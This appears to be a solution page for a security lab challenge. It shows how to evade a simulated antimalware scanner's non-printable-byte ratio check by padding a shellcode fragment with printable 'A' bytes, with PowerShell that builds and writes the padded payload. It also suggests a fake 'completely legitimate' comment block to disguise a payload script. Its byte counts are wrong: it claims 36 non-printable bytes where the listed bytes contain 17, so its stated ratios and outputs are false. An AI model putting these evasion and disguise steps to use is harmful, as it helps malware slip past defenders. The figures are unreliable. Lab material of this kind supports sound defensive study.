---
title: "Solution 16: Ratio Padding"
challenge_number: 16
difficulty: easy
category: "Non-Printable Ratio Bypass"
permalink: /solutions/16-ratio-padding/
---

# Solution: Ratio Padding

[Back to Challenge](../challenges/16-ratio-padding.md)

## Overview

Append printable ASCII padding to dilute the non-printable byte ratio below the 40% threshold. The shellcode remains intact and unmodified — you simply make the file larger by adding harmless printable content around it.

## Working Code

### Basic Approach: Shellcode + ASCII Padding

```powershell
# The raw shellcode (non-printable binary - DO NOT modify)
$shellcode = [byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00,
                      0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
                      0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
                      0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
                      0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7)

# Count non-printable bytes in the shellcode
$nonPrintable = ($shellcode | Where-Object { $_ -lt 0x20 -or $_ -gt 0x7E }).Count

# Calculate required padding: total_size must be > non_printable / 0.40
# So padding_needed = ceil(non_printable / 0.40) - shellcode.Length + 1
$requiredTotal = [Math]::Ceiling($nonPrintable / 0.40)
$paddingNeeded = $requiredTotal - $shellcode.Length + 1

Write-Host "Shellcode size: $($shellcode.Length) bytes"
Write-Host "Non-printable bytes: $nonPrintable"
Write-Host "Padding needed: $paddingNeeded bytes"

# Create padding (all 'A' = 0x41, printable ASCII)
$padding = [byte[]]::new($paddingNeeded)
for ($i = 0; $i -lt $paddingNeeded; $i++) { $padding[$i] = 0x41 }

# Combine: shellcode followed by padding
$finalFile = $shellcode + $padding

# Write to disk
[System.IO.File]::WriteAllBytes("padded_payload.bin", $finalFile)

# Verify the ratio
$totalNonPrintable = ($finalFile | Where-Object { $_ -lt 0x20 -or $_ -gt 0x7E }).Count
$ratio = $totalNonPrintable / $finalFile.Length
Write-Host "Final file size: $($finalFile.Length) bytes"
Write-Host "Final ratio: $([Math]::Round($ratio, 4)) (threshold: 0.40)"
```

### Concrete Example with Numbers

```powershell
# 40-byte shellcode where 36 bytes are non-printable (90% ratio in isolation)
$shellcode = [byte[]](
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00,
    0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7
)

# Need: 36 / total_size <= 0.40
# total_size >= 36 / 0.40 = 90 bytes
# padding = 90 - 40 + 1 = 51 bytes minimum

$padding = [byte[]](0x41) * 51  # 51 'A' characters

$file = $shellcode + $padding
[System.IO.File]::WriteAllBytes("padded.bin", $file)

# Result: 36 / 91 = 0.3956 (just under 0.40!)
```

### Alternative: Padding as Fake Comments

```
# For script files, use comments as padding:
# File: payload.ps1

<# 
This is a completely legitimate PowerShell script for system administration.
It performs routine maintenance tasks and generates compliance reports for
the IT security team. No malicious functionality whatsoever. This comment
block exists solely for documentation purposes and code readability.
#>
# (shellcode stored in a variable below this block)
$buf = [byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0 ...)
```

## Why It Works

The scanner's formula is:

```
ratio = non_printable_bytes / total_file_size
```

The threshold triggers at `ratio > 0.40`.

You **cannot** reduce the numerator (the shellcode must remain unmodified), but you **can** increase the denominator by appending printable content. Since printable bytes (0x20-0x7E) don't contribute to the numerator, every byte of padding only increases the denominator:

```
Original:  36 non-printable / 40 total = 0.90  → DETECTED
Padded:    36 non-printable / 91 total = 0.396 → PASSES
```

### The Formula

Given:
- `N` = number of non-printable bytes (fixed, from shellcode)
- `S` = current file size
- Target: `N / total_size ≤ 0.40`

Solving for required total size:
```
total_size ≥ N / 0.40 = 2.5 × N
```

Therefore:
```
padding_needed = ceil(N / 0.40) - S + 1
```

In general, you need the file to be at least **2.5 times** the number of non-printable bytes.

### Key Insight

The scanner computes a **global ratio** across the entire file. It does not analyze regions separately. It cannot tell that "these bytes are shellcode and those bytes are padding." Everything is mixed into one count.

## How to Verify

1. Create a padded file:
   ```powershell
   # Create 40 bytes of "shellcode" (mostly non-printable)
   $sc = [byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7)
   # Add 60 bytes of printable padding
   $pad = [System.Text.Encoding]::ASCII.GetBytes("A" * 60)
   [System.IO.File]::WriteAllBytes("test_padded.bin", $sc + $pad)
   ```

2. Verify the ratio manually:
   ```powershell
   $bytes = [System.IO.File]::ReadAllBytes("test_padded.bin")
   $np = ($bytes | Where-Object { $_ -lt 0x20 -or $_ -gt 0x7E }).Count
   Write-Host "Size: $($bytes.Length), Non-printable: $np, Ratio: $($np/$bytes.Length)"
   # Output: Size: 100, Non-printable: 36, Ratio: 0.36
   ```

3. Run the scanner:
   ```
   nim_antimalware_sim.exe test_padded.bin
   ```

4. Expected result: **No detection** - ratio 0.36 is below the 0.40 threshold.

5. Confirm the shellcode is intact:
   ```powershell
   $bytes = [System.IO.File]::ReadAllBytes("test_padded.bin")
   $first4 = ($bytes[0..3] | ForEach-Object { '0x' + $_.ToString('X2') }) -join ', '
   Write-Host "First 4 bytes: $first4"
   # Output: First 4 bytes: 0xFC, 0x48, 0x83, 0xE4
   ```
